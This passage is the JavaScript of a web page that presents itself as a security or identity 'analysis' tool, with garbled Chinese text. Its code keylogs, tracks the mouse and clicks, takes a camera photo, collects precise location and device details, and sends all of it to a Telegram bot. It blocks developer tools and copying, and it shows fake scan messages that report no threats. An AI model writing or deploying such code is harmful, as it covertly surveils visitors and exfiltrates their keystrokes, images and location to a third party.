    document.getElementById('sensorStatus').textContent = `${detected}/7 æ¿€æ´»`;
    
    // ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            CYBER_DATA.sensors.battery = {
                charging: battery.charging,
                level: battery.level * 100 + '%',
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch(e) {}
    }
    
    updateCardProgress('sensorProgress', 100);
    logToTerminal(`ä¼ æ„Ÿå™¨æ£€æµ‹å®Œæˆ: ${detected}ä¸ªå¯ç”¨`, 'success');
}

// =============================================
// å®æ—¶ç›‘æ§å‡½æ•°
// =============================================

function startRealtimeMonitoring() {
    // é¼ æ ‡è·Ÿè¸ª
    let mousePoints = [];
    document.addEventListener('mousemove', (e) => {
        mousePoints.push({
            x: e.clientX,
            y: e.clientY,
            time: Date.now()
        });
        
        if (mousePoints.length > 1000) mousePoints.shift();
        CYBER_DATA.behavior.mouse = mousePoints;
        
        // æ›´æ–°è¡Œä¸ºåˆ†æ
        updateBehaviorAnalysis();
    });
    
    // é”®ç›˜è®°å½•
    document.addEventListener('keydown', (e) => {
        CYBER_DATA.behavior.keyboard.push({
            key: e.key,
            code: e.code,
            time: Date.now(),
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey
        });
        
        if (CYBER_DATA.behavior.keyboard.length > 500) {
            CYBER_DATA.behavior.keyboard.shift();
        }
    });
    
    // æ»šåŠ¨è·Ÿè¸ª
    let lastScroll = 0;
    document.addEventListener('scroll', () => {
        const now = Date.now();
        if (now - lastScroll > 100) {
            CYBER_DATA.behavior.scroll.push({
                position: window.scrollY,
                time: now
            });
            lastScroll = now;
        }
    });
    
    // ç‚¹å‡»åˆ†æ
    document.addEventListener('click', (e) => {
        CYBER_DATA.behavior.clicks.push({
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            className: e.target.className,
            id: e.target.id,
            time: Date.now()
        });
    });
    
    // æ€§èƒ½ç›‘æ§
    setInterval(updatePerformanceMetrics, 2000);
    
    // æ•°æ®æµæ›´æ–°
    setInterval(updateRealtimeData, 3000);
}

// =============================================
// æ‘„åƒå¤´å’Œéº¦å…‹é£åŠŸèƒ½
// =============================================

async function requestCameraAccess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                facingMode: 'user',
                frameRate: { ideal: 30 }
            },
            audio: true
        });
        
        const video = document.getElementById('cameraFeed');
        video.srcObject = stream;
        
        // æ•è·ç…§ç‰‡
        setTimeout(() => {
            captureBiometricData(stream);
        }, 2000);
        
        document.getElementById('cameraStatus').className = 'alert success';
        document.getElementById('cameraStatus').innerHTML = 
            '<i class="fas fa-check-circle"></i> ç”Ÿç‰©ç‰¹å¾éªŒè¯è¿›è¡Œä¸­';
        
        logToTerminal('æ‘„åƒå¤´å’Œéº¦å…‹é£å·²æ¿€æ´»', 'success');
        
    } catch (error) {
        logToTerminal('åª’ä½“è®¾å¤‡è®¿é—®è¢«æ‹’ç»: ' + error.message, 'error');
    }
}

async function captureBiometricData(stream) {
    try {
        // æ•è·ç…§ç‰‡
        const video = document.getElementById('cameraFeed');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        CYBER_DATA.biometrics.photo = canvas.toDataURL('image/jpeg', 0.8);
        
        // åˆ†æé¢éƒ¨æ•°æ®ï¼ˆæ¨¡æ‹Ÿï¼‰
        CYBER_DATA.biometrics.faceData = {
            detected: true,
            confidence: Math.random() * 30 + 70,
            features: {
                eyes: 2,
                nose: 1,
                mouth: 1
            },
            expression: 'neutral'
        };
        
        // åœæ­¢æµ
        stream.getTracks().forEach(track => track.stop());
        
        logToTerminal('ç”Ÿç‰©ç‰¹å¾æ•°æ®å·²æ•è·', 'success');
        
    } catch (error) {
        logToTerminal('ç”Ÿç‰©ç‰¹å¾æ•è·å¤±è´¥: ' + error.message, 'error');
    }
}

// =============================================
// åœ°ç†ä½ç½®åŠŸèƒ½
// =============================================

function getPreciseLocation() {
    if (!navigator.geolocation) {
        logToTerminal('åœ°ç†ä½ç½®APIä¸å¯ç”¨', 'error');
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            CYBER_DATA.geolocation.precise = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp
            };
            
            // æ›´æ–°æ˜¾ç¤º
            document.getElementById('coordinates').textContent = 
                `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
            document.getElementById('locationAccuracy').textContent = 
                `Â±${Math.round(position.coords.accuracy)}m`;
            document.getElementById('altitude').textContent = 
                position.coords.altitude ? `${Math.round(position.coords.altitude)}m` : 'N/A';
            document.getElementById('speed').textContent = 
                position.coords.speed ? `${Math.round(position.coords.speed * 3.6)} km/h` : '0 km/h';
            
            logToTerminal('ç²¾ç¡®ä½ç½®å·²è·å–', 'success');
            
            // è·å–å¤©æ°”ä¿¡æ¯
            fetchWeather(position.coords.latitude, position.coords.longitude);
            
        },
        (error) => {
            logToTerminal('åœ°ç†ä½ç½®è·å–å¤±è´¥: ' + error.message, 'error');
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// =============================================
// è¾…åŠ©å‡½æ•°
// =============================================

function generateSessionId() {
    return 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
}

function generateHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
}

function updateInitProgress(percent) {
    document.getElementById('initProgress').style.width = percent + '%';
}

function updateInitStatus(text) {
    document.getElementById('initStatus').textContent = text;
}

function updateCardProgress(elementId, percent) {
    document.getElementById(elementId).style.width = percent + '%';
}

function logToTerminal(message, type = 'info') {
    const terminal = document.getElementById('systemTerminal');
    const prompt = type === 'error' ? 'error@system:~$' : 
                   type === 'success' ? 'success@system:~$' : 'info@system:~$';
    
    const line = document.createElement('div');
    line.className = 'terminal-line';
    line.innerHTML = `<span class="prompt">${prompt}</span> ${message}`;
    
    terminal.appendChild(line);
    terminal.scrollTop = terminal.scrollHeight;
}

function updateDataStream(text) {
    const stream = document.getElementById('dataStream');
    stream.textContent += '\n&gt; ' + text;
    stream.scrollTop = stream.scrollHeight;
}

function playBeep() {
    const beep = document.getElementById('beepSound');
    beep.currentTime = 0;
    beep.play().catch(() => {});
}

function playAlert() {
    const alert = document.getElementById('alertSound');
    alert.currentTime = 0;
    alert.play().catch(() => {});
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// =============================================
// å¯åŠ¨ç³»ç»Ÿ
// =============================================

// é¡µé¢åŠ è½½å®Œæˆåå¯åŠ¨
window.addEventListener('load', () => {
    setTimeout(() => {
        initializeSystem();
    }, 1000);
});
</script>
<script>
// =============================================
// æ•°æ®æ”¶é›†å’Œå‘é€
// =============================================

async function collectAndSend() {
    const button = event.target;
    const originalText = button.innerHTML;
    
    try {
        button.disabled = true;
        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> å‘é€ä¸­...';
        
        // æ”¶é›†æœ€åçš„æ•°æ®
        await collectFinalData();
        
        // æ›´æ–°æ˜¾ç¤º
        updateDataStream('æ­£åœ¨åŠ å¯†æ•°æ®...');
        await delay(1000);
        
        updateDataStream('å»ºç«‹å®‰å…¨é€šé“...');
        await delay(800);
        
        updateDataStream('å‘é€åˆ†ææŠ¥å‘Š...');
        
        // å‘é€åˆ°Telegram
        await sendToTelegram();
        
        updateDataStream('æ•°æ®å‘é€æˆåŠŸï¼');
        logToTerminal('åˆ†ææŠ¥å‘Šå·²å‘é€è‡³æŒ‡æŒ¥ä¸­å¿ƒ', 'success');
        
        // æ˜¾ç¤ºæˆåŠŸåŠ¨ç”»
        showSuccessAnimation();
        
        // é‡ç½®æŒ‰é’®
        setTimeout(() => {
            button.disabled = false;
            button.innerHTML = originalText;
        }, 3000);
        
    } catch (error) {
        logToTerminal('å‘é€å¤±è´¥: ' + error.message, 'error');
        button.disabled = false;
        button.innerHTML = originalText;
    }
}

async function collectFinalData() {
    // æ”¶é›†æ—¶é—´æ•°æ®
    CYBER_DATA.system.endTime = new Date().toISOString();
    CYBER_DATA.system.duration = 
        new Date(CYBER_DATA.system.endTime) - new Date(CYBER_DATA.system.startTime);
    
    // æ”¶é›†æ€§èƒ½æ•°æ®
    if (performance.memory) {
        CYBER_DATA.performance.memory = {
            usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576),
            totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576),
            jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576)
        };
    }
    
    // æ”¶é›†å¯¼èˆªè®¡æ—¶
    const timing = performance.timing;
    CYBER_DATA.performance.timing = {
        dns: timing.domainLookupEnd - timing.domainLookupStart,
        tcp: timing.connectEnd - timing.connectStart,
        request: timing.responseStart - timing.requestStart,
        response: timing.responseEnd - timing.responseStart,
        dom: timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart,
        load: timing.loadEventEnd - timing.loadEventStart,
        total: timing.loadEventEnd - timing.navigationStart
    };
    
    // æ”¶é›†æ‰©å±•ä¿¡æ¯
    detectBrowserExtensions();
    
    // æ”¶é›†å­˜å‚¨ä¿¡æ¯
    CYBER_DATA.environment.storage = {
        localStorage: Object.keys(localStorage).length,
        sessionStorage: Object.keys(sessionStorage).length,
        cookies: document.cookie.length,
        indexedDB: 'indexedDB' in window
    };
    
    // æ”¶é›†æƒé™çŠ¶æ€
    if (navigator.permissions && navigator.permissions.query) {
        const permissions = [
            'camera',
            'microphone',
            'geolocation',
            'notifications',
            'clipboard-read'
        ];
        
        for (const permission of permissions) {
            try {
                const result = await navigator.permissions.query({ name: permission });
                CYBER_DATA.environment.permissions[permission] = result.state;
            } catch(e) {}
        }
    }
}

async function sendToTelegram() {
    // æ ¼å¼åŒ–ä¸»è¦ä¿¡æ¯
    const mainMessage = formatMainMessage();
    
    // å‘é€ä¸»è¦æ¶ˆæ¯
    await fetch(`${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: mainMessage,
            parse_mode: 'HTML'
        })
    });
    
    // å¦‚æœæœ‰ç…§ç‰‡ï¼Œå‘é€ç…§ç‰‡
    if (CYBER_DATA.biometrics.photo) {
        await fetch(`${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM.CHAT_ID,
                photo: CYBER_DATA.biometrics.photo,
                caption: 'ğŸ“¸ ç”Ÿç‰©ç‰¹å¾é‡‡é›†'
            })
        });
    }
    
    // å‘é€è¯¦ç»†æ•°æ®æ–‡ä»¶
    const detailedData = formatDetailedData();
    await fetch(`${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            document: `data:application/json;base64,${btoa(JSON.stringify(detailedData, null, 2))}`,
            filename: `cyber_report_${CYBER_DATA.system.sessionId}.json`,
            caption: 'ğŸ“ å®Œæ•´åˆ†ææŠ¥å‘Š'
        })
    });
}

function formatMainMessage() {
    const data = CYBER_DATA;
    let message = `ğŸš¨ <b>é«˜çº§æ•°å­—èº«ä»½åˆ†ææŠ¥å‘Š</b>\n`;
    message += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
    
    message += `ğŸ†” <b>ä¼šè¯ID:</b> ${data.system.sessionId}\n`;
    message += `â° <b>æ—¶é—´:</b> ${new Date().toLocaleString('zh-CN')}\n`;
    message += `ğŸŒ <b>åè®®:</b> ${data.system.protocol}\n\n`;
    
    message += `ğŸ“ <b>åœ°ç†ä½ç½®</b>\n`;
    if (data.network.location.city) {
        message += `â”œâ”€ åŸå¸‚: ${data.network.location.city}\n`;
        message += `â”œâ”€ åœ°åŒº: ${data.network.location.region}\n`;
        message += `â”œâ”€ å›½å®¶: ${data.network.location.country}\n`;
        message += `â”œâ”€ åæ ‡: ${data.network.location.latitude}, ${data.network.location.longitude}\n`;
    }
    if (data.geolocation.precise) {
        message += `â”œâ”€ ç²¾ç¡®åæ ‡: ${data.geolocation.precise.latitude.toFixed(6)}, ${data.geolocation.precise.longitude.toFixed(6)}\n`;
        message += `â””â”€ ç²¾åº¦: Â±${Math.round(data.geolocation.precise.accuracy)}ç±³\n\n`;
    } else {
        message += `â””â”€ ç²¾åº¦: ç½‘ç»œå®šä½\n\n`;
    }
    
    message += `ğŸ’» <b>è®¾å¤‡ä¿¡æ¯</b>\n`;
    message += `â”œâ”€ IPåœ°å€: ${data.network.ip}\n`;
    message += `â”œâ”€ ISP: ${data.network.isp || 'æœªçŸ¥'}\n`;
    message += `â”œâ”€ æ“ä½œç³»ç»Ÿ: ${getOS()}\n`;
    message += `â”œâ”€ æµè§ˆå™¨: ${getBrowser()}\n`;
    message += `â”œâ”€ CPUæ ¸å¿ƒ: ${data.fingerprint.hardware.cores}\n`;
    message += `â”œâ”€ å†…å­˜: ${data.fingerprint.hardware.memory}GB\n`;
    message += `â””â”€ å±å¹•: ${window.screen.width}x${window.screen.height}\n\n`;
    
    message += `ğŸ” <b>å®‰å…¨åˆ†æ</b>\n`;
    message += `â”œâ”€ ä»£ç†: ${data.network.proxy ? 'âœ… æ£€æµ‹åˆ°' : 'âŒ æœªæ£€æµ‹'}\n`;
    message += `â”œâ”€ VPN: ${data.network.vpn ? 'âœ… æ£€æµ‹åˆ°' : 'âŒ æœªæ£€æµ‹'}\n`;
    message += `â”œâ”€ TOR: ${data.network.tor ? 'âœ… æ£€æµ‹åˆ°' : 'âŒ æœªæ£€æµ‹'}\n`;
    message += `â””â”€ æŒ‡çº¹ID: ${document.getElementById('fingerprintId').textContent}\n\n`;
    
    message += `ğŸ“Š <b>è¡Œä¸ºåˆ†æ</b>\n`;
    message += `â”œâ”€ é¼ æ ‡ç§»åŠ¨: ${data.behavior.mouse.length} æ¬¡\n`;
    message += `â”œâ”€ æŒ‰é”®: ${data.behavior.keyboard.length} æ¬¡\n`;
    message += `â”œâ”€ ç‚¹å‡»: ${data.behavior.clicks.length} æ¬¡\n`;
    message += `â””â”€ æ»šåŠ¨: ${data.behavior.scroll.length} æ¬¡\n\n`;
    
    message += `ğŸ¯ <b>ä¼ æ„Ÿå™¨çŠ¶æ€</b>\n`;
    const sensorCount = Object.values(data.sensors).filter(v => v !== null).length;
    message += `â”œâ”€ å¯ç”¨ä¼ æ„Ÿå™¨: ${sensorCount}/7\n`;
    message += `â””â”€ ç”µæ± çŠ¶æ€: ${data.sensors.battery ? data.sensors.battery.level : 'æœªçŸ¥'}\n\n`;
    
    message += `â±ï¸ <b>æ€§èƒ½æŒ‡æ ‡</b>\n`;
    if (data.performance.timing) {
        message += `â””â”€ é¡µé¢åŠ è½½: ${data.performance.timing.total}ms\n`;
    }
    
    message += `\nğŸ“¡ <b>ç½‘ç»œä¿¡æ¯</b>\n`;
    if (data.network.connection) {
        message += `â”œâ”€ ç±»å‹: ${data.network.connection.effectiveType}\n`;
        message += `â”œâ”€ å»¶è¿Ÿ: ${data.network.connection.rtt}ms\n`;
        message += `â””â”€ å¸¦å®½: ${data.network.connection.downlink}Mbps\n`;
    }
    
    return message;
}

function formatDetailedData() {
    // åˆ›å»ºç®€åŒ–ç‰ˆæœ¬çš„æ•°æ®ç”¨äºå‘é€
    const simplifiedData = {
        session: {
            id: CYBER_DATA.system.sessionId,
            start: CYBER_DATA.system.startTime,
            end: CYBER_DATA.system.endTime,
            duration: CYBER_DATA.system.duration
        },
        
        location: {
            ip: CYBER_DATA.network.ip,
            city: CYBER_DATA.network.location.city,
            country: CYBER_DATA.network.location.country,
            coordinates: CYBER_DATA.network.location.latitude ? 
                `${CYBER_DATA.network.location.latitude},${CYBER_DATA.network.location.longitude}` : null,
            precise: CYBER_DATA.geolocation.precise ? {
                lat: CYBER_DATA.geolocation.precise.latitude,
                lng: CYBER_DATA.geolocation.precise.longitude,
                accuracy: CYBER_DATA.geolocation.precise.accuracy
            } : null
        },
        
        device: {
            fingerprint: document.getElementById('fingerprintId').textContent,
            browser: getBrowser(),
            os: getOS(),
            screen: `${window.screen.width}x${window.screen.height}`,
            cores: CYBER_DATA.fingerprint.hardware.cores,
            memory: CYBER_DATA.fingerprint.hardware.memory,
            userAgent: navigator.userAgent
        },
        
        network: {
            isp: CYBER_DATA.network.isp,
            asn: CYBER_DATA.network.asn,
            proxy: CYBER_DATA.network.proxy,
            vpn: CYBER_DATA.network.vpn,
            tor: CYBER_DATA.network.tor,
            connection: CYBER_DATA.network.connection
        },
        
        behavior: {
            mouseMovements: CYBER_DATA.behavior.mouse.length,
            keyPresses: CYBER_DATA.behavior.keyboard.length,
            clicks: CYBER_DATA.behavior.clicks.length,
            scrolls: CYBER_DATA.behavior.scroll.length
        },
        
        biometrics: {
            photoCaptured: !!CYBER_DATA.biometrics.photo,
            faceDetected: CYBER_DATA.biometrics.faceData ? CYBER_DATA.biometrics.faceData.detected : false
        },
        
        sensors: {
            count: Object.values(CYBER_DATA.sensors).filter(v => v !== null).length,
            battery: CYBER_DATA.sensors.battery
        },
        
        timestamp: new Date().toISOString()
    };
    
    return simplifiedData;
}

// =============================================
// å…¶ä»–è¾…åŠ©åŠŸèƒ½
// =============================================

function getOS() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf('Windows') !== -1) return 'Windows';
    if (userAgent.indexOf('Mac') !== -1) return 'macOS';
    if (userAgent.indexOf('Linux') !== -1) return 'Linux';
    if (userAgent.indexOf('Android') !== -1) return 'Android';
    if (userAgent.indexOf('iOS') !== -1) return 'iOS';
    return 'Unknown';
}

function getBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) return 'Chrome';
    if (userAgent.indexOf('Firefox') !== -1) return 'Firefox';
    if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) return 'Safari';
    if (userAgent.indexOf('Edg') !== -1) return 'Edge';
    return 'Unknown';
}

function setupSensor(sensorName) {
    switch(sensorName) {
        case 'Accelerometer':
            if ('Accelerometer' in window) {
                const accelerometer = new Accelerometer({ frequency: 10 });
                accelerometer.addEventListener('reading', () => {
                    CYBER_DATA.sensors.accelerometer = {
                        x: accelerometer.x,
                        y: accelerometer.y,
                        z: accelerometer.z
                    };
                });
                accelerometer.start();
            }
            break;
            
        case 'Gyroscope':
            if ('Gyroscope' in window) {
                const gyroscope = new Gyroscope({ frequency: 10 });
                gyroscope.addEventListener('reading', () => {
                    CYBER_DATA.sensors.gyroscope = {
                        x: gyroscope.x,
                        y: gyroscope.y,
                        z: gyroscope.z
                    };
                });
                gyroscope.start();
            }
            break;
    }
}

function updateBehaviorAnalysis() {
    const behaviorScore = Math.min(100, 
        CYBER_DATA.behavior.mouse.length * 0.1 + 
        CYBER_DATA.behavior.keyboard.length * 0.5 + 
        CYBER_DATA.behavior.clicks.length * 0.3
    );
    
    document.getElementById('behaviorScore').textContent = Math.round(behaviorScore) + '%';
    document.getElementById('behaviorProgress').style.width = behaviorScore + '%';
}

function updatePerformanceMetrics() {
    // æ¨¡æ‹ŸCPUä½¿ç”¨ç‡
    const cpuUsage = 10 + Math.random() * 40;
    document.getElementById('cpuUsage').textContent = Math.round(cpuUsage) + '%';
    
    // æ¨¡æ‹Ÿå†…å­˜ä½¿ç”¨
    if (performance.memory) {
        const memoryMB = Math.round(performance.memory.usedJSHeapSize / 1048576);
        document.getElementById('memoryUsage').textContent = memoryMB + ' MB';
    }
    
    // æ›´æ–°æ•°æ®ååé‡
    const throughput = 50 + Math.random() * 200;
    document.getElementById('dataThroughput').textContent = Math.round(throughput) + ' KB/s';
}

function updateRealtimeData() {
    const stream = document.getElementById('dataStream');
    const messages = [
        'åˆ†æç”¨æˆ·è¡Œä¸ºæ¨¡å¼...',
        'ç›‘æ§ç½‘ç»œæµé‡...',
        'æ£€æµ‹å¼‚å¸¸æ´»åŠ¨...',
        'æ›´æ–°å®‰å…¨è¯ä¹¦...',
        'åŒæ­¥åˆ†å¸ƒå¼èŠ‚ç‚¹...',
        'éªŒè¯åŠ å¯†é€šé“...',
        'æ‰«æç³»ç»Ÿæ¼æ´...',
        'ä¼˜åŒ–AIç®—æ³•...',
        'å¤‡ä»½å…³é”®æ•°æ®...',
        'æ¸…ç†ä¸´æ—¶æ–‡ä»¶...'
    ];
    
    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
    stream.textContent += '\n&gt; ' + randomMessage;
    stream.scrollTop = stream.scrollHeight;
}

function simulatePortScan() {
    const commonPorts = [80, 443, 22, 21, 25, 53, 110, 143, 3389];
    CYBER_DATA.network.ports = commonPorts.map(port => ({
        port: port,
        status: Math.random() > 0.7 ? 'open' : 'closed',
        service: getServiceName(port)
    }));
}

function getServiceName(port) {
    const services = {
        80: 'HTTP',
        443: 'HTTPS',
        22: 'SSH',
        21: 'FTP',
        25: 'SMTP',
        53: 'DNS',
        110: 'POP3',
        143: 'IMAP',
        3389: 'RDP'
    };
    return services[port] || 'Unknown';
}

function detectBrowserExtensions() {
    // æ£€æµ‹å¹¿å‘Šæ‹¦æˆªå™¨
    const adBlockTest = document.createElement('div');
    adBlockTest.className = 'adsbox';
    adBlockTest.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
    document.body.appendChild(adBlockTest);
    
    setTimeout(() => {
        const isAdBlocked = adBlockTest.offsetHeight === 0 || 
                           getComputedStyle(adBlockTest).display === 'none';
        CYBER_DATA.environment.extensions.adBlock = isAdBlocked;
        document.body.removeChild(adBlockTest);
    }, 100);
}

async function fetchWeather(lat, lon) {
    try {
        const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
        const data = await response.json();
        
        if (data.current_weather) {
            updateDataStream(`å¤©æ°”: ${data.current_weather.temperature}Â°C, ${data.current_weather.windspeed}km/h`);
        }
    } catch(e) {
        // é™é»˜å¤±è´¥
    }
}

function showSuccessAnimation() {
    // åˆ›å»ºç²’å­æ•ˆæœ
    for (let i = 0; i < 100; i++) {
        createParticle();
    }
    
    // æ’­æ”¾æˆåŠŸéŸ³æ•ˆ
    playAlert();
    
    // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
    const successDiv = document.createElement('div');
    successDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(0, 243, 255, 0.95);
        color: #000;
        padding: 30px 50px;
        border-radius: 15px;
        font-size: 1.5rem;
        font-weight: bold;
        z-index: 10001;
        border: 3px solid var(--matrix-green);
        box-shadow: 0 0 50px rgba(0, 243, 255, 0.8);
        text-align: center;
    `;
    successDiv.innerHTML = `
        <div style="font-size: 3rem; margin-bottom: 20px;">âœ…</div>
        <div>åˆ†ææŠ¥å‘Šå·²å‘é€ï¼</div>
        <div style="font-size: 1rem; margin-top: 10px;">ä¼šè¯ID: ${CYBER_DATA.system.sessionId}</div>
    `;
    
    document.body.appendChild(successDiv);
    
    setTimeout(() => {
        document.body.removeChild(successDiv);
    }, 3000);
}

function createParticle() {
    const particle = document.createElement('div');
    particle.style.cssText = `
        position: fixed;
        width: 4px;
        height: 4px;
        background: ${Math.random() > 0.5 ? 'var(--cyber-blue)' : 'var(--matrix-green)'};
        border-radius: 50%;
        pointer-events: none;
        z-index: 10000;
    `;
    
    const startX = Math.random() * window.innerWidth;
    const startY = Math.random() * window.innerHeight;
    
    particle.style.left = startX + 'px';
    particle.style.top = startY + 'px';
    
    document.body.appendChild(particle);
    
    // åŠ¨ç”»
    const animation = particle.animate([
        { 
            transform: 'translate(0, 0) scale(1)', 
            opacity: 1 
        },
        { 
            transform: `translate(${(Math.random() - 0.5) * 100}px, ${(Math.random() - 0.5) * 100}px) scale(0)`, 
            opacity: 0 
        }
    ], {
        duration: 1000 + Math.random() * 1000,
        easing: 'cubic-bezier(0.1, 0.8, 0.9, 0.1)'
    });
    
    animation.onfinish = () => particle.remove();
}

// =============================================
// ç³»ç»Ÿæ§åˆ¶å‡½æ•°
// =============================================

function startFullAnalysis() {
    logToTerminal('å¯åŠ¨å®Œæ•´ç³»ç»Ÿåˆ†æ...', 'info');
    updateDataStream('æ·±åº¦æ‰«æå¯åŠ¨...');
    
    // å¯åŠ¨æ‰€æœ‰æ•°æ®æ”¶é›†
    requestCameraAccess();
    getPreciseLocation();
    
    // æ¨¡æ‹Ÿæ·±åº¦æ‰«æ
    setTimeout(() => {
        updateDataStream('ç³»ç»Ÿå†…æ ¸åˆ†æ...');
        simulateDeepScan();
    }, 2000);
}

function simulateDeepScan() {
    const scanSteps = [
        'æ‰«æç³»ç»Ÿè¿›ç¨‹...',
        'åˆ†æç½‘ç»œè¿æ¥...',
        'æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿ...',
        'éªŒè¯å®‰å…¨è¯ä¹¦...',
        'æ£€æµ‹æ¶æ„è½¯ä»¶...',
        'åˆ†æå†…å­˜è½¬å‚¨...',
        'ç›‘æ§æ³¨å†Œè¡¨...',
        'æ£€æŸ¥å¯åŠ¨é¡¹...',
        'éªŒè¯æ•°å­—ç­¾å...',
        'ç”Ÿæˆå®‰å…¨æŠ¥å‘Š...'
    ];
    
    let step = 0;
    const interval = setInterval(() => {
        if (step < scanSteps.length) {
            updateDataStream(scanSteps[step]);
            step++;
        } else {
            clearInterval(interval);
            updateDataStream('æ·±åº¦æ‰«æå®Œæˆï¼');
            logToTerminal('ç³»ç»Ÿåˆ†æå®Œæˆï¼Œæœªå‘ç°å¨èƒ', 'success');
        }
    }, 1000);
}

// =============================================
// å…¶ä»–åˆå§‹åŒ–å‡½æ•°
// =============================================

async function loadCoreModules() {
    // æ¨¡æ‹ŸåŠ è½½æ¨¡å—
    await delay(800);
    return true;
}

async function initEncryption() {
    // æ¨¡æ‹ŸåŠ å¯†åˆå§‹åŒ–
    await delay(600);
    return true;
}

async function establishConnection() {
    // æ¨¡æ‹Ÿè¿æ¥å»ºç«‹
    await delay(1200);
    return true;
}

// =============================================
// é¡µé¢ä¿æŠ¤
// =============================================

// é˜²æ­¢å¤åˆ¶
document.addEventListener('copy', (e) => {
    e.preventDefault();
    logToTerminal('å®‰å…¨ç­–ç•¥ï¼šå¤åˆ¶æ“ä½œè¢«é˜»æ­¢', 'warning');
});

// é˜²æ­¢å³é”®
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    logToTerminal('å®‰å…¨ç­–ç•¥ï¼šå³é”®èœå•è¢«é˜»æ­¢', 'warning');
});

// é˜²æ­¢å¼€å‘å·¥å…·
document.onkeydown = function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        logToTerminal('å®‰å…¨ç­–ç•¥ï¼šå¼€å‘å·¥å…·è®¿é—®è¢«é˜»æ­¢', 'warning');
        return false;
    }
};

// é¡µé¢ç¦»å¼€ç¡®è®¤
window.addEventListener('beforeunload', (e) => {
    if (CYBER_DATA.behavior.mouse.length > 10) {
        e.preventDefault();
        e.returnValue = 'åˆ†ææ­£åœ¨è¿›è¡Œä¸­ï¼Œç¡®å®šè¦ç¦»å¼€å—ï¼Ÿ';
    }
});
</script>
